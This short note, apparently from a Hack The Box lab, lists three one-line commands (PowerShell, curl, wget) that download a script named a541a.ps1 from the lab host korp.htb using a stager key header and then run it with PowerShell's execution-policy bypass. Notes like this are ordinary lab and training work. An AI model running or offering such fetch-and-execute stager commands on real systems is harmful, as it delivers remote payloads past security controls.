
2025-03-26 16:03

Source: 

Tags: 

### **Using PowerShell (Windows)**

Run this command to manually execute the request in PowerShell:

`Invoke-WebRequest -Uri "http://korp.htb:53673/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1 powershell.exe -exec Bypass -File "a541a.ps1"`

### **Using `curl` (Linux/macOS/Windows)**

On Linux or Windows (with WSL), use `curl`:

`curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" -o a541a.ps1 http://korp.htb:53673/a541a powershell -exec Bypass -File "a541a.ps1"`

### **Using `wget` (Linux/macOS)**

`wget --header="X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" -O a541a.ps1 http://korp.htb:53673/a541a powershell -exec Bypass -File "a541a.ps1"`


### References
